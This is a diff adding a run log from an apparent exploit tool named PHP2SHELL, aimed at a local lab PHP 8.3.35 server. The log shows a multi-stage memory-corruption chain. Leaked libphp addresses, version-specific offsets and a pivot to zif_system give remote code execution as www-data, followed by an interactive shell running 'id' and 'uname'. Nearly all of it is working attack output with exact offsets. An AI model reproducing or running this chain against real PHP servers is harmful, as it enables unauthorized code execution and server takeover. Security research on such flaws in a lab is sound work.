@@ -1,0 +1,48 @@
+=== PHP2SHELL one-shot live exploit — URL is the only input ===
+(local lab target: ./run.sh, e.g. http://127.0.0.1:18118/index.php)
+Target URL: [*] preflight: HTTP 200 body=b'OK\n' powered=PHP/8.3.35
+[*] private target 127.0.0.1 — using /out proof-file channel
+=== PHP2SHELL one-shot live ===
+output channel: out-file (local lab)
+[1/3] automated chain: A1+B1 leak -> A2+B2 -> RCE proof
+[*] profile PHP 8.3.35: zif=0x3ac080 dtor=0x49ec50 a1_progress=1000 b1_off=0x968 s_mode=dtor delta=0xf9398
+[*] target: http://127.0.0.1:18138/index.php
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1251293 set-cookie=[1251074]
+      decoded=819208 zval_ptr_dtor=0x7ff04c6adc50 -> libphp=0x7ff04c20f000
+      chunk buckets: [('0x7ff042400000', 3527), ('0x7ff04c600000', 1168), ('0x7ff042e00000', 165)]
+      dtor anchor: bucket=0x7ff04c600000 carrier_chunk=0x7ff04a600000
+[try 1] A2 + B2 (1/1): base=0x7ff04a600000 S=0x7ff04a6f9398 zif_system=0x7ff04c5bb080
+[+] output (/out/o6be29467):
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[*] profile PHP 8.3.35: RCE proof ok
+[2/2] interactive shell — one line = one full chain run (200-byte cmd limit); 'exit' quits
+php2shell> [*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1251293 set-cookie=[1251074]
+      decoded=819208 zval_ptr_dtor=0x7ff04c6adc50 -> libphp=0x7ff04c20f000
+      chunk buckets: [('0x7ff042400000', 3527), ('0x7ff04c600000', 1168), ('0x7ff042e00000', 165)]
+      dtor anchor: bucket=0x7ff04c600000 carrier_chunk=0x7ff04a600000
+[try 1] A2 + B2 (1/1): base=0x7ff04a600000 S=0x7ff04a6f9398 zif_system=0x7ff04c5bb080
+[+] output (/out/o3f1812d7):
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+php2shell> [*] exec: uname -sr
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1251293 set-cookie=[1251074]
+      decoded=819208 zval_ptr_dtor=0x7ff04c6adc50 -> libphp=0x7ff04c20f000
+      chunk buckets: [('0x7ff042400000', 3527), ('0x7ff04c600000', 1168), ('0x7ff042e00000', 165)]
+      dtor anchor: bucket=0x7ff04c600000 carrier_chunk=0x7ff04a600000
+[try 1] A2 + B2 (1/1): base=0x7ff04a600000 S=0x7ff04a6f9398 zif_system=0x7ff04c5bb080
+[+] output (/out/ofade1f38):
+Linux 5.15.153.1-microsoft-standard-WSL2
+php2shell>
